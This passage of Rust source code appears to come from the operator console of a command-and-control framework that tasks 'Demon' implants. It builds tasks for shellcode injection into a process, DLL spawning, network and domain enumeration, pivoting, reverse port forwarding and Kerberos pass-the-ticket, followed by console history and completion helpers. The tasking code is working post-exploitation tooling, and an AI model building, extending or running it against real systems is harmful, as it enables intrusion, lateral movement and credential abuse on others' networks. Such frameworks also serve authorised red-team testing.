        command_id: u32::from(DemonCommand::CommandInjectShellcode).to_string(),
        command_line: command_line.to_owned(),
        command: Some("inject-shellcode".to_owned()),
        extra: BTreeMap::from([
            ("PID".to_owned(), serde_json::Value::Number(serde_json::Number::from(pid))),
            ("Binary".to_owned(), serde_json::Value::String(binary_b64)),
        ]),
        ..AgentTaskInfo::default()
    })
}

fn spawn_dll_console_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let dll_path = parts.next().ok_or_else(|| "Usage: spawn-dll <dll-path> [args]".to_owned())?;
    let args = parts.next().unwrap_or_default().trim().to_owned();
    let binary =
        std::fs::read(dll_path).map_err(|err| format!("Failed to read `{dll_path}`: {err}"))?;
    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
    let args_b64 = if args.is_empty() {
        String::new()
    } else {
        base64::engine::general_purpose::STANDARD.encode(args.as_bytes())
    };
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandSpawnDll).to_string(),
        command_line: command_line.to_owned(),
        command: Some("spawn-dll".to_owned()),
        extra: BTreeMap::from([
            ("Binary".to_owned(), serde_json::Value::String(binary_b64)),
            ("Arguments".to_owned(), serde_json::Value::String(args_b64)),
        ]),
        ..AgentTaskInfo::default()
    })
}

fn net_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next(); // skip "net"
    let sub = parts.next().ok_or_else(|| {
        "Usage: net <domain|logons|sessions|computers|dclist|share|localgroup|group> [args]"
            .to_owned()
    })?;
    let args: String = parts.collect::<Vec<_>>().join(" ");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandNet).to_string(),
        command_line: command_line.to_owned(),
        command: Some("net".to_owned()),
        sub_command: Some(sub.to_ascii_lowercase()),
        arguments: if args.is_empty() { None } else { Some(args) },
        ..AgentTaskInfo::default()
    })
}

fn pivot_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next();
    let sub =
        parts.next().ok_or_else(|| "Usage: pivot <list|connect|disconnect> [args]".to_owned())?;
    let args: String = parts.collect::<Vec<_>>().join(" ");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandPivot).to_string(),
        command_line: command_line.to_owned(),
        command: Some("pivot".to_owned()),
        sub_command: Some(sub.to_ascii_lowercase()),
        arguments: if args.is_empty() { None } else { Some(args) },
        ..AgentTaskInfo::default()
    })
}

fn rportfwd_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next();
    let sub =
        parts.next().ok_or_else(|| "Usage: rportfwd <add|remove|list|clear> [args]".to_owned())?;
    let args: String = parts.collect::<Vec<_>>().join(" ");
    let sub_lower = sub.to_ascii_lowercase();
    let sub_full = format!("rportfwd {sub_lower}");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandSocket).to_string(),
        command_line: command_line.to_owned(),
        command: Some("socket".to_owned()),
        sub_command: Some(sub_full),
        arguments: if args.is_empty() { None } else { Some(args.replace(' ', ";")) },
        ..AgentTaskInfo::default()
    })
}

fn kerberos_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next();
    let sub =
        parts.next().ok_or_else(|| "Usage: kerberos <luid|klist|purge|ptt> [args]".to_owned())?;
    let args: String = parts.collect::<Vec<_>>().join(" ");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandKerberos).to_string(),
        command_line: command_line.to_owned(),
        command: Some("kerberos".to_owned()),
        sub_command: Some(sub.to_ascii_lowercase()),
        arguments: if args.is_empty() { None } else { Some(args) },
        ..AgentTaskInfo::default()
    })
}

fn config_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next();
    let sub = parts.next().ok_or_else(|| "Usage: config <option> [value]".to_owned())?;
    let args: String = parts.collect::<Vec<_>>().join(" ");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandConfig).to_string(),
        command_line: command_line.to_owned(),
        command: Some("config".to_owned()),
        sub_command: Some(sub.to_ascii_lowercase()),
        arguments: if args.is_empty() { None } else { Some(args) },
        ..AgentTaskInfo::default()
    })
}

pub(crate) fn rest_after_word(input: &str) -> Result<String, String> {
    let mut parts = input.trim().splitn(2, char::is_whitespace);
    let _ = parts.next();
    let rest = parts.next().map(str::trim).unwrap_or_default();
    if rest.is_empty() {
        Err("This command requires an argument.".to_owned())
    } else {
        Ok(rest.to_owned())
    }
}

// ─── Console history / completion helpers ────────────────────────────────────

pub(crate) fn push_history_entry(console: &mut AgentConsoleState, command_line: &str) {
    if console.history.last().is_some_and(|last| last == command_line) {
        console.history_index = None;
        console.completion_index = 0;
        console.completion_seed = None;
        return;
    }

    console.history.push(command_line.to_owned());
    console.history_index = None;
    console.completion_index = 0;
    console.completion_seed = None;
}

pub(crate) fn apply_history_step(console: &mut AgentConsoleState, direction: HistoryDirection) {
    if console.history.is_empty() {
        return;
    }

    let next_index = match (direction, console.history_index) {
        (HistoryDirection::Older, None) => Some(console.history.len().saturating_sub(1)),
        (HistoryDirection::Older, Some(index)) => Some(index.saturating_sub(1)),
        (HistoryDirection::Newer, Some(index)) if index + 1 < console.history.len() => {
            Some(index + 1)
        }
        (HistoryDirection::Newer, Some(_)) => None,
        (HistoryDirection::Newer, None) => None,
    };

    console.history_index = next_index;
    console.input =
        next_index.and_then(|index| console.history.get(index).cloned()).unwrap_or_default();
    console.completion_index = 0;
    console.completion_seed = None;
}

pub(crate) fn apply_completion(console: &mut AgentConsoleState) {
    let prefix = console.input.trim();
    if prefix.contains(char::is_whitespace) {
        return;
    }

    let seed = console
        .completion_seed
        .clone()
        .filter(|seed| !seed.is_empty())
        .unwrap_or_else(|| prefix.to_owned());
    let matches = console_completion_candidates(&seed);
    if matches.is_empty() {
        return;
    }

    if console.completion_seed.as_deref() != Some(seed.as_str()) {
        console.completion_index = 0;
    }

    let next = console.completion_index % matches.len();
    console.input = matches[next].to_owned();
    console.completion_index = next + 1;
    console.completion_seed = Some(seed);
}

pub(crate) fn console_completion_candidates(prefix: &str) -> Vec<&'static str> {
    let needle = prefix.trim().to_ascii_lowercase();
    if needle.is_empty() {
        return CONSOLE_COMMANDS.iter().map(|spec| spec.name).collect();
    }

    CONSOLE_COMMANDS
        .iter()
        .filter(|spec| {
            spec.name.starts_with(&needle)
                || spec.aliases.iter().any(|alias| alias.starts_with(&needle))
        })
        .map(|spec| spec.name)
        .collect()
}

pub(crate) fn closest_command_usage(command: &str) -> Option<&'static str> {
    CONSOLE_COMMANDS.iter().find_map(|spec| {
        (spec.name == command || spec.aliases.contains(&command)).then_some(spec.usage)
    })
}

#[allow(dead_code)]
pub(crate) fn split_console_selection<'a>(
    open_consoles: &'a [String],
    selected_console: Option<&'a str>,
) -> Vec<&'a str> {
    if open_consoles.is_empty() {
        return Vec::new();
    }

    let selected = selected_console.unwrap_or(open_consoles[0].as_str());
    let mut visible = vec![selected];
    for agent_id in open_consoles {
        if agent_id != selected {
            visible.push(agent_id.as_str());
        }
        if visible.len() == 2 {
            break;
        }
    }
    visible
}
